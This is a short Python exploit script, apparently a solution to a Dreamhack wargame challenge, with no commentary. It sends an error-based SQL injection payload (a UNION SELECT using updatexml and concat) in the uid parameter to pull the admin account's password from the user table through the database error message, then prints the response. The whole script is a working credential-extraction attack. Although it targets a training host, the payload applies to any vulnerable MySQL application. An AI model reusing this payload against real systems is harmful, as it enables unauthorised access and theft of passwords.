from requests import get
host = "http://host1.dreamhack.games:15407/"
headers = {'content-length' : '128'}
query = f"'union SELECT updatexml(null,concat(0x4b,(SELECT upw FROM user WHERE uid='admin')),null);"
r = get(f"{host}/?uid={query}")

print(r.text)